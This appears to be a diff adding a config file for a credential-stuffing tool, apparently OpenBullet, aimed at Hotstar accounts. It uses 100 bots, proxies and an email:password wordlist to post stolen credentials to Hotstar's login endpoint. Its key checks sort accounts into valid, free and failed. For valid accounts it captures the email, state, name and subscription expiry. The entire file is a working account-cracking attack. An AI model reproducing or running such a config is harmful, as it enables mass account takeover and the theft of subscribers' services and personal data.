@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Hotstar",
+  "SuggestedBots": 100,
+  "LastModified": "2018-08-08T14:06:57.4664889+00:00",
+  "AdditionalInfo": "",
+  "Author": "Praveen",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST REQUEST GET "https://account.hotstar.com/AVS/besc?action=Login&appVersion=5.0.40" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.hotstar.com/subscribe/sign-in" 
+#LOGIN_PAGE REQUEST POST "https://account.hotstar.com/AVS/besc?action=Login&appVersion=5.0.40" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&channel=PCTV" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.hotstar.com/subscribe/sign-in" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"User not logged\"" 
+    KEY "\":\"Incorrect username or  password.\",\"" 
+  KEYCHAIN Success OR 
+    KEY "resultCode\":\"OK\",\"resultObj\":\"" 
+#REDIRECT REQUEST GET "https://account.hotstar.com/AVS/besc?action=GetUserInfo&appVersion=5.0.40&channel=PCTV&cv=881d8767-6f8b-43b6-9941-5c62f03467d5&userAttributes=SUBSCRIPTION_STATUS" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"User not logged\"" 
+    KEY "\":\"Incorrect username or password.\"" 
+  KEYCHAIN Success OR 
+    KEY "\"SUBSCRIPTION_STATUS\":\"SR\"" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"SUBSCRIPTION_STATUS\":\"C\"" 
+    KEY "\"SUBSCRIPTION_STATUS\":\"R\"" 
+#EMAIL PARSE "<SOURCE>" LR "\"resultObj\":{\"crmAccountId\":\"" "\",\"userAttribute\"" Recursive=FALSE -> CAP "EMAIL" "" "" 
+#CITY_[India] PARSE "<SOURCE>" LR "\"STATE\":\"" "\"" Recursive=FALSE -> CAP "CITY [India]" "" "" 
+#NAME PARSE "<SOURCE>" LR ",\"name\":\"" "\"" Recursive=FALSE -> CAP "NAME" "" "" 
+#EXP PARSE "<SOURCE>" LR "~exp=" "~acl" Recursive=FALSE -> VAR "EXP" "" "" 
+#EXP FUNCTION UnixTimeToISO8601 "<EXP>" -> CAP "EXP" 
